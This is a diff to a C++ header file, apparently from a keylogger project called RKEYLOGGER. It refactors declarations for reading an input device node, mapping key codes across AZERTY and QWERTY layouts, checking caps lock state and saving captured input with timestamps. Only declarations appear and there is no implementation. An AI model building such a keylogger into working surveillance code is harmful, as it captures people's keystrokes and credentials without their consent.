@@ -1,19 +1,15 @@
 #ifndef __RKEYLOGGER_APK__
-#define  __RKEYLOGGER_APK__
+#define __RKEYLOGGER_APK__
     
     #include <string>
     
     enum class Layout { AZERTY, QWERTY };
-    enum class KeyboardMode { SHIFT, ALTGR, NORMAL };
-    
-    struct KeyValue{
-        const char* normal;
-        const char* shift;
-        const char* altgr;
-    };
+    struct KeyValue{ const char* normal; const char* shift; const char* altgr; };
 
     void read_devnode(const char* devnode);
-    int map_code(int code, int value);
+    bool map_code(int code, int value);
+    void emit_correct_code(int code);
+    void save_input(const char* text);
 
     //TODO
     void setLayout(Layout layout);
@@ -22,5 +18,5 @@
     std::string current_datetime();
 
     //To detect if capslock was already pressed when we launch the programs
-    bool capsclock_status();
+    bool get_capsclock_status();
 #endif
